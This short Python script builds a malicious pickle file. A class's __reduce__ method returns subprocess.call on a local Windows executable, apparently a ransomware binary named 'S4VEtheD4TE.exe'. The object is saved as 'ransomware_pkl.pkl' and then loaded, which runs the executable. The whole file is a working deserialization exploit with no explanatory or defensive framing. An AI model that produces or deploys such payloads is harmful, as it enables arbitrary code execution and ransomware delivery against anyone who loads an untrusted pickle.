import builtins
import os
import pickle
import subprocess

class OpenFile(object):
    def __reduce__(self):
        return (subprocess.call, ([r"C:\Users\RazEl\Downloads\Release\netcoreapp3.1\S4VEtheD4TE.exe"],))

with open('ransomware_pkl.pkl', 'wb') as f:
    pickle.dump(OpenFile(), f)


with open('ransomware_pkl.pkl', 'rb') as f:
    obj = pickle.load(f)